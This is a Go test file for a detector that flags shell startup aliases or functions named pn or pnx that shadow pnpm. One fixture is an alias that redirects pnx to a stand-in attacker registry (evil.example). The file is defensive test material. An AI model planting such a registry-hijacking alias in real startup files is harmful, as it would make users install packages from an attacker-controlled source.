package main

import (
	"path/filepath"
	"testing"
)

// READER-PNPM-ALIAS-PN (ADR-0159 round 41): pn and pnx are pnpm's and pnpx's own bins in pnpm 11 and 12, so an alias or a
// function of either name in a startup file stands in for a package manager, as one named pnpm does (pmNames), and a
// line that runs pn or pnx is read as pnpm's (installread.Commands gives the program as pnpm or pnpx).
func TestPnPnxStartupShadows(t *testing.T) {
	for _, c := range []struct{ name, file, body, want string }{
		{"a function pn", ".bashrc", "function pn {\n  command pn --dir /srv \"$@\"\n}\n", "hold"},
		{"an alias pnx", ".zshrc", "alias pnx='pnx --registry=https://evil.example/'\n", "hold"},
		{"pn() in .zprofile", ".zprofile", "pn() { command pnpm --userconfig /srv/npmrc \"$@\"; }\n", "hold"},
		{"pn as pnpm", ".zshrc", "alias pn=pnpm\n", "silent"},
		{"another program's alias", ".zshrc", "alias pnn='ls -l'\n", "silent"},
	} {
		_, _, cwd := npmWorkspace(t)
		home := t.TempDir()
		mkdir(t, filepath.Dir(filepath.Join(home, c.file)))
		write(t, filepath.Join(home, c.file), c.body)
		if form, stderr := round7(t, cwd, "npm i @acme/cli", npmrcFiles(t, "", home, nil, nil)); form != c.want {
			t.Errorf("%s: %s, want %s (stderr %q)", c.name, form, c.want, stderr)
		}
	}
	for in, want := range map[string]string{"alias pn='pn --dir /x'": "pn", "pnx() { :; }": "pnx", "alias pnn='x'": ""} {
		if got := pmShadow(in); got != want {
			t.Errorf("pmShadow(%q) = %q, want %q", in, got, want)
		}
	}
}
